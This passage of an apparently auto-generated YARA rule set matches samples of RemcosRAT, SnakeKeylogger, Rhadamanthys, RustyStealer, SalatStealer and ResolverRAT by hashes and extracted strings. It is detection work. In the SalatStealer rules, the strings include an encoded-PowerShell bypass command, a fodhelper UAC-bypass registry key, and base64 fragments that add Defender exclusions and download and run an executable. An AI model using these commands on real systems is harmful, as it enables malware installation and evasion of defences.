      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9151f8c3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9151f8c3b1a24fdd94d2787da6df89bc590d32e20fe5485dc6032ca7384747e6"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s3 = "questedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\"><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" /><" ascii /* score: '26.00'*/
      $s4 = "83031752990.exe" fullword wide /* score: '19.00'*/
      $s5 = "I83031752990, Version=1.0.3523.10739, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s6 = "<assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\" /><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\"><securi" ascii /* score: '14.00'*/
      $s7 = ".NET Framework 4.5l" fullword ascii /* score: '10.00'*/
      $s8 = "fefeffeefa" ascii /* score: '8.00'*/
      $s9 = "afeffefefe" ascii /* score: '8.00'*/
      $s10 = "ffeeffefe" ascii /* score: '8.00'*/
      $s11 = "fefeffeefef" ascii /* score: '8.00'*/
      $s12 = "feffeefefa" ascii /* score: '8.00'*/
      $s13 = "fefefeffeef" ascii /* score: '8.00'*/
      $s14 = "ffeeffefefe" ascii /* score: '8.00'*/
      $s15 = "feffeefeffe" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a1c82397 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a1c82397.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a1c82397ee529114e6d388f9fd658fbb2cefd2e4324576c637189aeba1ead526"
   strings:
      $s1 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s2 = "Xxuorxzdhr.Execution" fullword ascii /* score: '23.00'*/
      $s3 = "Xxuorxzdhr.exe" fullword wide /* score: '22.00'*/
      $s4 = "ExecutorToken" fullword ascii /* score: '19.00'*/
      $s5 = "connectionExecutor" fullword ascii /* score: '19.00'*/
      $s6 = "ExecuteMapper" fullword ascii /* score: '18.00'*/
      $s7 = "ExecuteScheduledExecutor" fullword ascii /* score: '18.00'*/
      $s8 = "HXxuorxzdhr, Version=1.0.3403.11294, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s9 = "m_SetExecutor" fullword ascii /* score: '16.00'*/
      $s10 = "GuideExecutor" fullword ascii /* score: '16.00'*/
      $s11 = "StopActiveExecutor" fullword ascii /* score: '16.00'*/
      $s12 = "DividedExecutor" fullword ascii /* score: '16.00'*/
      $s13 = "RunLiteralExecutor" fullword ascii /* score: '16.00'*/
      $s14 = "SortExecutor" fullword ascii /* score: '16.00'*/
      $s15 = "RunSeparatedExecutor" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__26a27143 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_26a27143.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "26a2714342c817548962d1a9cf5ebb1aacb811c3060fea1269c8280047b8eddf"
   strings:
      $s1 = "fdpU.exe" fullword wide /* score: '22.00'*/
      $s2 = "fdpU.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "get_DigitalRoot" fullword ascii /* score: '12.00'*/
      $s4 = "GetDigitalRoot" fullword ascii /* score: '12.00'*/
      $s5 = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s6 = "Primes_{0}_{1}.txt" fullword wide /* score: '11.00'*/
      $s7 = "Built with .NET Framework 4.0" fullword wide /* score: '10.00'*/
      $s8 = "get_IsPrime" fullword ascii /* score: '9.00'*/
      $s9 = "get_FactorCount" fullword ascii /* score: '9.00'*/
      $s10 = "GetPrimeFactorization" fullword ascii /* score: '9.00'*/
      $s11 = "<GetPrimesWithDigitSum>b__0" fullword ascii /* score: '9.00'*/
      $s12 = "get_IsPalindromic" fullword ascii /* score: '9.00'*/
      $s13 = "get_IsArmstrong" fullword ascii /* score: '9.00'*/
      $s14 = "get_IsDeficient" fullword ascii /* score: '9.00'*/
      $s15 = "get_PrimeFactors" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__cf473160 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cf473160.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cf473160304d369b5b254d3b32299767da9d51b1e9e8c726d65c08ed1f2a136b"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\LqmqQRJqIr\\src\\obj\\Debug\\UXIS.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s4 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD~" fullword ascii /* score: '27.00'*/
      $s5 = "get_loginError" fullword ascii /* score: '23.00'*/
      $s6 = "UXIS.exe" fullword wide /* score: '22.00'*/
      $s7 = "get_loginAfter" fullword ascii /* score: '20.00'*/
      $s8 = "loginError" fullword wide /* score: '18.00'*/
      $s9 = "MMMMMMO" fullword ascii /* reversed goodware string 'OMMMMMM' */ /* score: '16.50'*/
      $s10 = "loginAfter" fullword wide /* score: '15.00'*/
      $s11 = "get_Fitness" fullword ascii /* score: '9.00'*/
      $s12 = "* Z,DWB.r" fullword ascii /* score: '9.00'*/
      $s13 = "waycount" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__d47105e79f5c0c9284c6762e9f8cc1ad_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_d47105e79f5c0c9284c6762e9f8cc1ad(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1bc96921149b3309dd3bb9f9512907a84657d681fab1da28abfa058b3f281a08"
   strings:
      $x1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" wide /* base64 encoded string  */ /* reversed goodware string 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' */ /* score: '38.50'*/
      $s2 = "icuuc69.dll" fullword wide /* score: '23.00'*/
      $s3 = "icudt69.dll" fullword ascii /* score: '23.00'*/
      $s4 = "?getMutex@UMutex@icu_69_plex@@AAEPAVmutex@std@@XZ" fullword ascii /* score: '20.00'*/
      $s5 = "?gListHead@UMutex@icu_69_plex@@0PAV12@A" fullword ascii /* score: '20.00'*/
      $s6 = "ubidi_getProcessedLength_69_plex" fullword ascii /* score: '20.00'*/
      $s7 = "uscript_getUsage_69_plex" fullword ascii /* score: '20.00'*/
      $s8 = "?compare_exchange_strong@?$atomic@PAVmutex@std@@@std@@QCE_NAAPAVmutex@2@QAV32@W4memory_order@2@@Z" fullword ascii /* score: '18.00'*/
      $s9 = "?getSupportedIDs@ICUResourceBundleFactory@icu_69_plex@@MBEPBVHashtable@2@AAW4UErrorCode@@@Z" fullword ascii /* score: '18.00'*/
      $s10 = "?getKey@ICUService@icu_69_plex@@QBEPAVUObject@2@AAVICUServiceKey@2@AAW4UErrorCode@@@Z" fullword ascii /* score: '18.00'*/
      $s11 = "?compare_exchange_weak@?$atomic@PAVmutex@std@@@std@@QCE_NAAPAVmutex@2@QAV32@W4memory_order@2@2@Z" fullword ascii /* score: '18.00'*/
      $s12 = "?getKey@ICUService@icu_69_plex@@QBEPAVUObject@2@AAVICUServiceKey@2@PAVUnicodeString@2@PBVICUServiceFactory@2@AAW4UErrorCode@@@Z" fullword ascii /* score: '18.00'*/
      $s13 = "?getVisibleIDs@ICUService@icu_69_plex@@QBEAAVUVector@2@AAV32@AAW4UErrorCode@@@Z" fullword ascii /* score: '18.00'*/
      $s14 = "?get@ICUService@icu_69_plex@@QBEPAVUObject@2@ABVUnicodeString@2@AAW4UErrorCode@@@Z" fullword ascii /* score: '18.00'*/
      $s15 = "?compare_exchange_strong@?$_Atomic_storage@PAVmutex@std@@$03@std@@QAE_NAAPAVmutex@2@QAV32@W4memory_order@2@@Z" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4e59c60c {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4e59c60c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4e59c60c8ce4d441d9c5dc4fa1b4e510aaec47ce44a0b862ec00cd739a9b8e14"
   strings:
      $s1 = "ASau.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://github.com/textmerger" fullword wide /* score: '17.00'*/
      $s3 = "Processor Count: {0}" fullword wide /* score: '17.00'*/
      $s4 = "TextProcessor" fullword ascii /* score: '15.00'*/
      $s5 = "groupBoxProcessing" fullword wide /* score: '15.00'*/
      $s6 = "textProcessor" fullword ascii /* score: '15.00'*/
      $s7 = "Text Processing Options" fullword wide /* score: '15.00'*/
      $s8 = ".NET Framework: 4.0.0.0" fullword wide /* score: '15.00'*/
      $s9 = "targetEncoding" fullword ascii /* score: '14.00'*/
      $s10 = "ASau.pdb" fullword ascii /* score: '14.00'*/
      $s11 = "merged.txt" fullword wide /* score: '14.00'*/
      $s12 = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s13 = "A Windows Forms application for merging multiple text files with customizable separators and processing options." fullword wide /* score: '11.00'*/
      $s14 = "Preview Merged Content" fullword wide /* score: '11.00'*/
      $s15 = ".NET Framework: {0}" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__bd9e0807 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bd9e0807.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bd9e08075d83ae69399f6c11bbf50729cab0cff666754b1b015b26ca5030324d"
   strings:
      $s1 = "EiH.exe" fullword wide /* score: '19.00'*/
      $s2 = "IronWardenProcess" fullword ascii /* score: '15.00'*/
      $s3 = ".NET Framework 4.5<" fullword ascii /* score: '10.00'*/
      $s4 = "ghostNumber" fullword ascii /* score: '9.00'*/
      $s5 = "get_yuksekSkor" fullword ascii /* score: '9.00'*/
      $s6 = "bizimaraba" fullword ascii /* score: '8.00'*/
      $s7 = "shvevba" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule RustyStealer_signature__6170eb509edf6f256d874ec9ac2efc43_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_6170eb509edf6f256d874ec9ac2efc43(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "40b0fa31dacf38f3dd555661ccada21748fb012b3f70b0e44cc3d4dc1429d548"
   strings:
      $x1 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s2 = "#$*+-./:?@\\_cmd.exe /e:ON /v:OFF /d /c \"f" fullword ascii /* score: '28.00'*/
      $s3 = "NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseA" ascii /* score: '27.00'*/
      $s4 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s5 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\std\\src\\io\\mod.rsp" fullword ascii /* score: '27.00'*/
      $s6 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\std\\src\\thread\\local.r" ascii /* score: '26.00'*/
      $s7 = "cmd.exe/c" fullword ascii /* score: '25.00'*/
      $s8 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\alloc\\src\\boxed.rs" fullword ascii /* score: '24.00'*/
      $s9 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\alloc\\src\\raw_vec.rs" fullword ascii /* score: '24.00'*/
      $s10 = "Errorgetrandom: this target is not supportederrno: did not return a positive valueunexpected situationSecRandomCopyBytes: iOS Se" ascii /* score: '24.00'*/
      $s11 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\alloc\\src\\collections" ascii /* score: '24.00'*/
      $s12 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\alloc\\src\\slice.rs" fullword ascii /* score: '24.00'*/
      $s13 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\alloc\\src\\collections" ascii /* score: '24.00'*/
      $s14 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\std\\src\\io\\mod.rs" fullword ascii /* score: '24.00'*/
      $s15 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\core\\src\\iter\\traits" ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule SalatStealer_signature__63c558c25deb865d330acf0806bd66bf_imphash_ {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_63c558c25deb865d330acf0806bd66bf(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1cb9a68770a0018a66d62e992b36f3fab2539f70266af33c733537088e8615e8"
   strings:
      $x1 = "powershell -ExecutionPolicy Bypass -EncodedCommand %s" fullword ascii /* score: '46.00'*/
      $x2 = "cmd.exe /c START \"\" \"" fullword wide /* score: '39.00'*/
      $x3 = "C:\\Users\\Void\\Desktop\\gg\\Project1\\x64\\Release\\Project1.pdb" fullword ascii /* score: '33.00'*/
      $s4 = "\\System32\\fodhelper.exe" fullword wide /* score: '24.00'*/
      $s5 = "ZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcwBhAG0AbgBpAG4AagBhADYANgA2AC8AdABlAHMAdAAyADIAOAAvAHIAYQB3AC8A" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s6 = "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s7 = "bABlAHoAaQBsAGEAMwAyAC4AZQB4AGUAIgAgAC0AVgBhAGwAdQBlACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABUAGUAbQBwAFwAZgBpAGwA" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s8 = "IgBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4A" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s9 = "cgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBmAGkAbABlAHoAaQBsAGEAMwAyAC4AZQB4AGUAIAAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoA" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s10 = "Software\\Classes\\ms-settings\\shell\\open\\command" fullword wide /* score: '13.00'*/
      $s11 = "ZQB6AGkAbABhADMAMgAuAGUAeABlACIAIAAtAFQAeQBwAGUAIABTAHQAcgBpAG4AZwANAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAJABlAG4AdgA6AEwA" ascii /* score: '11.00'*/
      $s12 = "TwBDAEEATABBAFAAUABEAEEAVABBAFwAVABlAG0AcABcAGYAaQBsAGUAegBpAGwAYQAzADIALgBlAHgAZQAiAA==" fullword ascii /* base64 encoded string*/ /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      1 of ($x*) and all of them
}

rule SalatStealer_signature__971afde26a9678b597aba00403978dd9_imphash_ {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_971afde26a9678b597aba00403978dd9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4e149c61cb0da1f933e20293778868a1c80d91255d9eb09192f5462d1513ae72"
   strings:
      $x1 = "powershell -ExecutionPolicy Bypass -EncodedCommand %s" fullword ascii /* score: '46.00'*/
      $x2 = "C:\\Users\\Void\\Desktop\\gg\\Project1\\x64\\Release\\Project1.pdb" fullword ascii /* score: '33.00'*/
      $s3 = "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s4 = "cwBhAG0AbgBpAG4AagBhADYANgA2AC8AbABhAHMAdAAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBzAHkAcwB0AGUAbQBtAGEAaQBsADMA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s5 = "VABBAFwAVABlAG0AcAAiADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8A" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s6 = "cwB0AGUAbQAzADIALgBlAHgAZQAiADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABUAGUA" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s7 = "MgAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQBcAFQAZQBtAHAAXAB3AGkAbgBkAG8AdwBzAHkA" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s8 = "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEA" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s9 = "\\fodhelper.exe" fullword wide /* score: '16.00'*/
      $s10 = "gSoftware\\Classes\\ms-settings\\shell\\open\\command" fullword wide /* score: '13.00'*/
      $s11 = "bQBwAFwAdwBpAG4AZABvAHcAcwB5AHMAdABlAG0AMwAyAC4AZQB4AGUAIgA=" fullword ascii /* base64 encoded string*/ /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__cabce955 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cabce955.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cabce955d78a0d271591f2bd6b7d28ac9fd7b740882cb90e12b49f5335869e13"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADx&y" fullword ascii /* score: '27.00'*/
      $s2 = "oJI.exe" fullword wide /* score: '19.00'*/
      $s3 = "IronWardenProcess" fullword ascii /* score: '15.00'*/
      $s4 = "\\getfunky.wav" fullword wide /* score: '13.00'*/
      $s5 = "K@@@@@" fullword ascii /* reversed goodware string '@@@@@K' */ /* score: '11.00'*/
      $s6 = "oJI.pdb" fullword ascii /* score: '11.00'*/
      $s7 = "sunflower.jpg" fullword wide /* score: '10.00'*/
      $s8 = "flower.jpg" fullword wide /* score: '10.00'*/
      $s9 = "ghostNumber" fullword ascii /* score: '9.00'*/
      $s10 = "get_yuksekSkor" fullword ascii /* score: '9.00'*/
      $s11 = "UPlq/- " fullword ascii /* score: '8.00'*/
      $s12 = "bizimaraba" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__79f29e19 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_79f29e19.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "79f29e19a0a27f7619fd475614f372433b26c95e9f8c11c1622ec9cc3c16eca5"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADx&y" fullword ascii /* score: '27.00'*/
      $s2 = "csg.exe" fullword wide /* score: '19.00'*/
      $s3 = "IronWardenProcess" fullword ascii /* score: '15.00'*/
      $s4 = "\\getfunky.wav" fullword wide /* score: '13.00'*/
      $s5 = "csg.pdb" fullword ascii /* score: '11.00'*/
      $s6 = "sunflower.jpg" fullword wide /* score: '10.00'*/
      $s7 = "flower.jpg" fullword wide /* score: '10.00'*/
      $s8 = "Agdi.sef" fullword ascii /* score: '10.00'*/
      $s9 = "ghostNumber" fullword ascii /* score: '9.00'*/
      $s10 = "get_yuksekSkor" fullword ascii /* score: '9.00'*/
      $s11 = "bizimaraba" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ba8cc276 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ba8cc276.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ba8cc276a98e4822f672e7655d88829ce6b243cbf01e31cc4eb6c28544a9b86b"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADx&y" fullword ascii /* score: '27.00'*/
      $s2 = "FXP.exe" fullword wide /* score: '19.00'*/
      $s3 = "IronWardenProcess" fullword ascii /* score: '15.00'*/
      $s4 = "\\getfunky.wav" fullword wide /* score: '13.00'*/
      $s5 = "FXP.pdb" fullword ascii /* score: '11.00'*/
      $s6 = "sunflower.jpg" fullword wide /* score: '10.00'*/
      $s7 = "flower.jpg" fullword wide /* score: '10.00'*/
      $s8 = "ghostNumber" fullword ascii /* score: '9.00'*/
      $s9 = "get_yuksekSkor" fullword ascii /* score: '9.00'*/
      $s10 = "bizimaraba" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__02008697 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_02008697.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "020086975001e27c95565f8040b7e637fbee03497b950f8c0cae4ed7a3d1074f"
   strings:
      $s1 = "Owlvvomexbz.exe" fullword wide /* score: '22.00'*/
      $s2 = "ReportReadableLogger" fullword ascii /* score: '20.00'*/
      $s3 = "LogOperationalLogger" fullword ascii /* score: '19.00'*/
      $s4 = "ProcessPassiveEnumerator" fullword ascii /* score: '18.00'*/
      $s5 = "m_TokenizerLoggers" fullword ascii /* score: '17.00'*/
      $s6 = "ReportVirtualLogger" fullword ascii /* score: '17.00'*/
      $s7 = "_PassiveLoggerData" fullword ascii /* score: '17.00'*/
      $s8 = "WaitForCommonLogger" fullword ascii /* score: '17.00'*/
      $s9 = "WaitForRemoteLogger" fullword ascii /* score: '17.00'*/
      $s10 = "ReportControllableLogger" fullword ascii /* score: '17.00'*/
      $s11 = "LogCombinedLogger" fullword ascii /* score: '17.00'*/
      $s12 = "loggerUserElements" fullword ascii /* score: '17.00'*/
      $s13 = "HOwlvvomexbz, Version=1.0.6354.6545, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s14 = "Owlvvomexbz.Logging" fullword ascii /* score: '16.00'*/
      $s15 = "m_IsCreatorProcessor" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      8 of them
}

rule ResolverRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file ResolverRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "48c8318860e4ad8eaabaa740dedf267da5a6ae2d032c61be0a9df62dabe1c607"
   strings:
      $s1 = "Oaaireskw.exe" fullword wide /* score: '22.00'*/
      $s2 = "injectconfig" fullword ascii /* score: '21.00'*/
      $s3 = "EncryptorRunner" fullword ascii /* score: '17.00'*/
      $s4 = "GOaaireskw, Version=1.0.3618.27720, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s5 = "adjustableExecutor" fullword ascii /* score: '16.00'*/
      $s6 = "InterruptibleEncryptor" fullword ascii /* score: '14.00'*/
      $s7 = "m_EncryptorTesterLimit" fullword ascii /* score: '14.00'*/
      $s8 = "_EncryptorDictionaryLength" fullword ascii /* score: '14.00'*/
      $s9 = "m_EncryptorArgumentInterval" fullword ascii /* score: '14.00'*/
      $s10 = "procEncryptor" fullword ascii /* score: '14.00'*/
      $s11 = "AssignAdjustableCommand" fullword ascii /* score: '12.00'*/
      $s12 = "m_ContainerCommandArray" fullword ascii /* score: '12.00'*/
      $s13 = "SeparatedDecryptor" fullword ascii /* score: '11.00'*/
      $s14 = "_DictionaryDecryptorIdx" fullword ascii /* score: '11.00'*/
      $s15 = "versionpol" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7914b50d {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7914b50d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7914b50d3cb4dfdbb2cc92b4b833d2e87416c39fb81f8979297a989f9b9c4bed"
   strings:
      $s1 = "aCT.exe" fullword wide /* score: '19.00'*/
      $s2 = "GetPlainTextContent" fullword ascii /* score: '14.00'*/
      $s3 = "get_YouTube_Logo" fullword ascii /* score: '14.00'*/
      $s4 = "get_PlainTextContent" fullword ascii /* score: '14.00'*/
      $s5 = "SmartNote - Intelligent Note Manager" fullword wide /* score: '12.00'*/
      $s6 = "aCT.pdb" fullword ascii /* score: '11.00'*/
      $s7 = "Text files (*.txt)|*.txt|HTML files (*.html)|*.html" fullword wide /* score: '11.00'*/
      $s8 = "Error exporting notes: " fullword wide /* score: '10.00'*/
      $s9 = "get_CreatedDate" fullword ascii /* score: '9.00'*/
      $s10 = "get_SpellCheckEnabled" fullword ascii /* score: '9.00'*/
      $s11 = "<GetStatistics>b__36_0" fullword ascii /* score: '9.00'*/
